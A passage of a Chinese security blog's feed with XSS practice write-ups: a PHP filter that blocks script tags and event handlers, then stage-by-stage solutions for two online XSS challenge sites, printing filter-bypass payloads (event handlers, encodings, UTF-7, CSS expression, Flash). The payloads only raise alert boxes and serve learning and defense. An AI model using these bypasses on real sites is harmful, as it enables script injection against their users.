title="防御："></a>防御：</h3><p>对于采用过滤、转义来防御xss漏洞最基本的方式，具体实现，必须基于代码，而对应的防御招式已经许多前辈们都有分享。我觉得做好编码、过滤的工作之后，下面两个措施也是有必要实施的。<br>1：为Cookie加上HttpOnly标记。保护好cookie，就算各种过滤都被绕过，也无法读取、修改cookie，能有效的减轻危害。<br>2：部署waf是一件很有效的工作。一个具有丰富规则库的waf能大幅度过滤掉恶意输入数据，个人感觉主要是能增加突破防御的难度，不仅仅针对于xss漏洞，其他的漏洞也是一样。能有效降低其风险。<br>下面是一个php的xss过滤器：(学习于网上，将该代码加入到核心函数库，然后再调用即可)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    function RemoveXSS($val) &#123;  </div><div class="line">       // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed  </div><div class="line">       // this prevents some character re-spacing such as &lt;java\0script&gt;  </div><div class="line">       // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs  </div><div class="line">       $val = preg_replace(&apos;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&apos;, &apos;&apos;, $val);  </div><div class="line">         </div><div class="line">       // straight replacements, the user should never need these since they&apos;re normal characters  </div><div class="line">       // this prevents like &lt;IMG SRC=@avascript:alert(&apos;XSS&apos;)&gt;  </div><div class="line">       $search = &apos;abcdefghijklmnopqrstuvwxyz&apos;; </div><div class="line">       $search .= &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;  </div><div class="line">       $search .= &apos;1234567890!@#$%^&amp;*()&apos;; </div><div class="line">       $search .= &apos;~`&quot;;:?+/=&#123;&#125;[]-_|\&apos;\\&apos;; </div><div class="line">       for ($i = 0; $i &lt; strlen($search); $i++) &#123; </div><div class="line">          // ;? matches the ;, which is optional </div><div class="line">          // 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars </div><div class="line">        </div><div class="line">          // @ @ search for the hex values </div><div class="line">          $val = preg_replace(&apos;/(&amp;#[xX]0&#123;0,8&#125;&apos;.dechex(ord($search[$i])).&apos;;?)/i&apos;, $search[$i], $val); // with a ; </div><div class="line">          // @ @ 0&#123;0,7&#125; matches &apos;0&apos; zero to seven times  </div><div class="line">          $val = preg_replace(&apos;/(&amp;#0&#123;0,8&#125;&apos;.ord($search[$i]).&apos;;?)/&apos;, $search[$i], $val); // with a ; </div><div class="line">       &#125; </div><div class="line">        </div><div class="line">       // now the only remaining whitespace attacks are \t, \n, and \r </div><div class="line">       $ra1 = Array(&apos;javascript&apos;, &apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;meta&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;style&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;); </div><div class="line">       $ra2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;); </div><div class="line">       $ra = array_merge($ra1, $ra2); </div><div class="line">        </div><div class="line">       $found = true; // keep replacing as long as the previous round replaced something </div><div class="line">       while ($found == true) &#123; </div><div class="line">          $val_before = $val; </div><div class="line">          for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; </div><div class="line">             $pattern = &apos;/&apos;; </div><div class="line">             for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; </div><div class="line">                if ($j &gt; 0) &#123; </div><div class="line">                   $pattern .= &apos;(&apos;;  </div><div class="line">                   $pattern .= &apos;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&apos;; </div><div class="line">                   $pattern .= &apos;|&apos;;  </div><div class="line">                   $pattern .= &apos;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&apos;; </div><div class="line">                   $pattern .= &apos;)*&apos;; </div><div class="line">                &#125; </div><div class="line">                $pattern .= $ra[$i][$j]; </div><div class="line">             &#125; </div><div class="line">             $pattern .= &apos;/i&apos;;  </div><div class="line">             $replacement = substr($ra[$i], 0, 2).&apos;&lt;x&gt;&apos;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag  </div><div class="line">             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  </div><div class="line">             if ($val_before == $val) &#123;  </div><div class="line">                // no replacements were made, so exit the loop  </div><div class="line">                $found = false;  </div><div class="line">             &#125;  </div><div class="line">          &#125;  </div><div class="line">       &#125;  </div><div class="line">       return $val;  </div><div class="line">    &#125;   </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><strong><em>参考链接：</em></strong><br><a href="http://www.freebuf.com/sectool/108568.html" target="_blank" rel="external">http://www.freebuf.com/sectool/108568.html</a><br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="external">https://www.secpulse.com/archives/44299.html</a><br><a href="https://www.waitalone.cn/the-seven-principles-of-xss-defense.html" target="_blank" rel="external">https://www.waitalone.cn/the-seven-principles-of-xss-defense.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;心得&quot;&gt;&lt;a href=&quot;#心得&quot; class=&quot;headerlink&quot; title=&quot;心得&quot;&gt;&lt;/a&gt;心得&lt;/h3&gt;&lt;p&gt;接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(2)</title>
    <link href="http://sunu11.com/2017/07/23/13/"/>
    <id>http://sunu11.com/2017/07/23/13/</id>
    <published>2017-07-23T03:43:55.000Z</published>
    <updated>2017-08-28T14:02:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>接着上一文过来，这一部分是第二个环境的做题记录。<a id="more"></a></p><h2 id="平台2-xsqler-win"><a href="#平台2-xsqler-win" class="headerlink" title="平台2 xsqler.win"></a>平台2 <a href="http://sqler.win/xss/index.php" target="_blank" rel="external">xsqler.win</a></h2><p><strong><em>Stage#1: <a href="http://sqler.win/xss/level1.php?name=test" target="_blank" rel="external">http://sqler.win/xss/level1.php?name=test</a></em></strong><br>本关简单，使用svg\body\style \ iframe等标签均可过关。<br>payload: <code>http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#2: <a href="http://sqler.win/xss/level2.php?keyword=test" target="_blank" rel="external">http://sqler.win/xss/level2.php?keyword=test</a></em></strong><br>本题与第一题差不多，只需要进行标签的闭合即可。<br>payload:<br><code>http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#3：<a href="http://sqler.win/xss/level3.php?writing=wait" target="_blank" rel="external">http://sqler.win/xss/level3.php?writing=wait</a></em></strong><br>本题通过测试，可得知过滤了&lt;&gt;，且只能用’闭合标签。于是采用on事件型如onmouseover、onmouseout、onclick等进行绕过。Payload: <code>&#39;onmouseover=&#39;alert(1)</code></p><p><strong><em>Stage#4: <a href="http://sqler.win/xss/level4.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level4.php?keyword=</a></em></strong><br>本题与上题类似，使用”闭合标签即可：payload：<code>&quot;onmouseover=&#39;alert(1)’</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-13.png" alt="图13"></p><p><strong><em>Stage#5: <a href="http://sqler.win/xss/level5.php?keyword=find" target="_blank" rel="external">http://sqler.win/xss/level5.php?keyword=find</a> a way out! </em></strong><br>本题比较简单，增加了过滤范围，on-&gt;o_n 然后需要闭合。可以使用<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code>通过点击出现的链接进行通关。</p><p><strong><em>Stage#6: <a href="http://sqler.win/xss/level6.php?keyword=break" target="_blank" rel="external">http://sqler.win/xss/level6.php?keyword=break</a> it out! </em></strong><br>随便哪一个试一下，处理掉了src、herf、onxxx、等，需要进行绕过，通过大小写，成功绕过payload：<code>&quot;&gt;&lt;a HRef=javascript:alert(1)&gt;</code></p><p><strong><em>Stage#7: <a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题对输入的script、on等进行了单层过滤，可以使用其过滤不严，采用此类payload绕过即可：<code>&lt;svg/oonnload=alert(1)&gt;、或者将script写成scrscriptipt</code>的方式构造即可。</p><p><strong><em>Stage#8:<a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题已经给出了一个<a>标签,但是过滤了script、src等，大小写无法绕过，但是可以使用html编码进行绕过payload：<code>javasc&amp;#114;ipt:alert(1)</code></a></p><p><strong><em>Stage#9：<a href="http://sqler.win/xss/level9.php?keyword=not" target="_blank" rel="external">http://sqler.win/xss/level9.php?keyword=not</a> bad! </em></strong><br>本题最大的难点在于绕合法连接，发现只有带<code>http://</code>的url才能被认为是合法链接，另外由于“”也被过滤，其他规则与上一关相同，因此需要进行编码。于是构造payload： <code>javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;)</code></p><p><strong><em>Stage#10：<a href="http://sqler.win/xss/level10.php?keyword=well" target="_blank" rel="external">http://sqler.win/xss/level10.php?keyword=well</a> done! </em></strong><br>本题存在三个隐藏输入框，构造如下get请求，查看元素后，发现t_sort能被写入，如图：<br>get请求：<a href="http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333" target="_blank" rel="external">http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333</a></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-14.png" alt="图14"></p><p>因此只需要在该参数处构造跨站脚本语句即可，使用<code>&quot;onmouseover=&#39;alert(1)&#39;</code>然后让输入框属性显示出来改hidden为text即可：payload如下：<br><code>http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#11：<a href="http://sqler.win/xss/level11.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level11.php?keyword=good</a> job! </em></strong><br>通过查看元素，发现t_ref的value是我们这个网页的referer值，抓包修改referer输入xss payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code>即可，本题不想多说什么，感觉referer一般存在xss的极少。</p><p><strong><em>Stage#12：<a href="http://sqler.win/xss/level12.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level12.php?keyword=good</a> job! </em></strong><br>查看元素可看到t_ua参数的value是User-Agent值，和上一题一样，修改为xss payload即可：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#13：<a href="http://sqler.win/xss/level13.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level13.php?keyword=good</a> job! </em></strong><br>此题思路同上，这次传参位置为cookie，payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;；</code>感觉这三题是绕脑洞的样子，，，但是在测试过程中还真没发现过，，，，</p><p><strong><em>Stage#14：<a href="http://sqler.win/xss/level14.php" target="_blank" rel="external">http://sqler.win/xss/level14.php</a></em></strong><br>本题可以在查看元素发现嵌入了一个iframe页面，访问该页面是查看图片EXIF信息的，通过看答案知道有EXIF在解析过程中，某些插件在解析时输出未处理可导致xss漏洞，因此食用exiftool工具，修改图片EXIF后，进行上传，然后解析过程中弹窗。学习了，，，， </p><p><strong><em>Stage#15：<a href="http://sqler.win/xsschallenge/level15.php?src=1.jpg" target="_blank" rel="external">http://sqler.win/xsschallenge/level15.php?src=1.jpg</a></em></strong><br>本关说是利用src可包含前面页面上的xss漏洞，然后进行弹窗，怎么尝试都没弹出来，，，表示无奈。。。。。</p><p><strong><em>Stage#16：<a href="http://sqler.win/xss/level16.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level16.php?keyword=</a></em></strong><br>本题终于回到常规绕的思路上了，，经过尝试，可以判断过滤了空格，/等符号，然后尝试绕过，很多姿势都不行，包括编码，进制，截断等然后发现换行符可以绕过：%0a、%0d，因此，payload：<br><code>http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt;</code></p><p><strong><em>Stage#17：<a href="http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b</a></em></strong><br>本题比较简单，在arg02参数值中写入事件型payload即可触发，payload:<br><code>http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1)</code></p><p><strong><em>Stage#18：ttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b</em></strong><br>本题与上一题相似，但是arg02无法构造出空格，也就没办法写入输出语句，然后试了试arg01，果然换汤不换药，直接写入payload：<code>%20onmousedown=alert(1)</code></p><p><strong><em>Stage#19：<a href="http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b" target="_blank" rel="external">http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b</a></em></strong><br>右键查看元素可以看到一个swf文件被调用，然后设想为flash xss，通过下载该文件，使用JPEXS进行分析，发现为actionscript 2.0，然后知道actionscript 2.0是有可以使用getURL来执行javascript下面以一个实例来剖析Flash XSS过程。有点拗口，，,然后对应本题，定位geturl函数：</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-15.png" alt="图15"><br>可以看到在sIFR的内容中当getURL打开时，version是可以传入到loc4中的，因此定位contentIsLink函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function contentIsLink()</div><div class="line">  &#123;</div><div class="line">     return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p><p>然后可以根据contentIsLink函数构造出payload:<br><code>http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E</code></p><p><strong><em>Stage#20：<a href="http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b</a></em></strong><br>本题个人感觉比上一题容易做出来，，下载swf文件使用JPEXS进行分析后可以发现是zeroclipboard.swf，然后百度一发，<img src="http://www.freebuf.com/sectool/108568.html" alt="freebuf">第一个，粘贴即可payload：<br><code>http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500</code><br><img src="http://ofum8yjv2.bkt.clouddn.com/q-16.png" alt="图16"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接着上一文过来，这一部分是第二个环境的做题记录。
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(1)</title>
    <link href="http://sunu11.com/2017/07/20/12/"/>
    <id>http://sunu11.com/2017/07/20/12/</id>
    <published>2017-07-20T01:43:55.000Z</published>
    <updated>2017-08-28T14:02:45.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h2><p>XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。<a id="more"></a><br>攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。本文主要是通过几个在线练习平台，记录一下个人对于xss漏洞的一些思路和总结。</p><h2 id="平台1-xss-quiz"><a href="#平台1-xss-quiz" class="headerlink" title="平台1 xss-quiz"></a>平台1 <a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">xss-quiz</a></h2><p><strong><em>Stage#1: <a href="http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9</a></em></strong></p><p>使用正常xss payload弹出domain即可通过。payload如：<br><code>&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-1.png" alt="图1"></p><p><strong><em>Stage#2: <a href="http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d</a></em></strong><br>这一题关键在于语句需要闭合，当闭合语句后，均可触发。payload如：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;  &quot;onclick=alert(document.domain) value=&quot;asd</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-2.png" alt="图2"></p><p><strong><em>Stage#3: <a href="http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7</a></em></strong><br>该题在写入js语句后，对尖括号进行了转义</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-3.png" alt="图3"></p><p>尝试绕过，没有实现，但是可以在p2参数的参数值处构造跨站语句，成功弹出domain</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-4.png" alt="图4"></p><p><strong><em>Stage#4: <a href="http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0</a></em></strong><br>p1、p2均作过滤了，在p3处闭合语句即可弹出，可通过查看源码发现隐藏的输入框，修改hackme的那个type为text，即p3的输入点即可，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><strong><em>Stage#5: <a href="http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e</a></em></strong><br>长度限制，使用burp改包绕过即可。也可以更改如图所示长度进行绕过，payload：<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-5.png" alt="图5"></p><p><strong><em>Stage#6: <a href="http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725</a></em></strong><br>该题过滤了尖括号&lt;&gt;，<br><img src="http://ofum8yjv2.bkt.clouddn.com/q-6.png" alt="图6"><br>尝试绕过，发现可用鼠标移动类进行绕过如：<br><code>&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)等</code></p><p><strong><em>Stage#7: <a href="http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8</a></em></strong><br>通过测试，发现该题过滤了&lt;&gt;、”、&amp;等，而且输入空格后自动添加双引号，因此，可构造此类payload如: <code>a onmouseover=alert(document.domain)</code>实现弹窗。</p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-7.png" alt="图7"></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-8.png" alt="图8"></p><p><strong><em>Stage#8: <a href="http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa</a></em></strong><br>此题采用javascript伪协议即可，比较简单。Payload：<code>javascript:alert(document.domain);</code></p><p><em>*</em>Stage#9: <a href="http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934</a><br>此题提示信息为UTF7,因此通过UTF-7转码即可，不用burp截包，需要更改charset类型为text，并更改其value为UTF-7,然后即可弹窗payload：<br><code>+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk-</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-9.png" alt="图9"></p><p><strong><em>Stage#10: <a href="http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38</a></em></strong><br>通过提示可看到domain被过滤了，可使用dodomainmain嵌套的方式进行绕过，因此，payload为：<code>&quot;onmouseover=&quot;alert(document.domdomainain);//</code></p><p><strong><em>Stage#11: <a href="http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9</a></em></strong><br>可以从提示中看到过滤规则如下：”s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;”，因此可以通过进行编码的方式构造xss语句。注意闭合前后。即可弹窗，payload：<br><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-10.png" alt="图10"></p><p><strong><em>Stage#12: <a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a</a></em></strong><br>此题过滤规则如下：”s/[\x00-\x20\&lt;>\”\’]//g;”，过滤很严，从x00-x20,&lt;&gt;,”’都被过滤，于是用什么闭合是此题的关键，在IE8下可以通过`进行闭合因此，可以构造payload：<br><code>`` onmouseover=alert(document.domain);</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-11.png" alt="图11"></p><p><strong><em>Stage#13: <a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage13_0.php?sid=eb77af0358676519402c3be00df480f638b168b7</a></em></strong><br>此题说是再CSS中用expression来实现js中的on事件，进而执行xss语句，再ie下可以利用，payload如下：xx:expression(onmouseover=function(){alert(document.domain)})</p><p><strong><em>Stage#14: <a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-_-14.php?sid=91443a5a0cc083c52ce78d11b5bf1beb238cb93b</a></em></strong><br>此题与上一题相似，但是做了过滤：s/(url|script|eval|expression)/xxx/ig;过滤url，eval，script，expression因此，需要尝试绕过过滤，经过尝试，可以利用注释符<code>/**/、\、\0、编码</code>等方式绕过。Payload如：<br><code>xx:expre/**/ssion(onmouseover=function(){alert(document.domain)})</code></p><p><strong><em>Stage#15：<a href="http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726</a></em></strong><br>本题经过测试将&lt;&gt;进行了转义，并且过滤了\，无法使用事件类型构造语句实现弹窗。因此考虑绕过其过滤规则，经过测试，可以使用编码进行绕过将&lt;&gt;进行16进制编码或者unicode编码即可。Payload:<br><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e</code><br><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e</code></p><p><img src="http://ofum8yjv2.bkt.clouddn.com/q-12.png" alt="图12"></p><p><strong><em>Stage#16：<a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00000016.php?sid=b3c99680d88d8f9002dce8b26f167c9c0a3a73a9</a></em></strong><br>此题与上一题相似，多一部分过滤：”s/\x/\\x/ig;”，因此无法使用16进制来绕过&lt;&gt;的过滤，用unicode编码同样可以绕过，也可以使用10进制绕过。<br>Payload: <code>\\74script\\76alert(document.domain);\\74/script\\76</code></p><p>Stage#17、Stage#18因为版本问题，过不去23333333。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;科普&quot;&gt;&lt;a href=&quot;#科普&quot; class=&quot;headerlink&quot; title=&quot;科普&quot;&gt;&lt;/a&gt;科普&lt;/h2&gt;&lt;p&gt;XSS漏洞是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
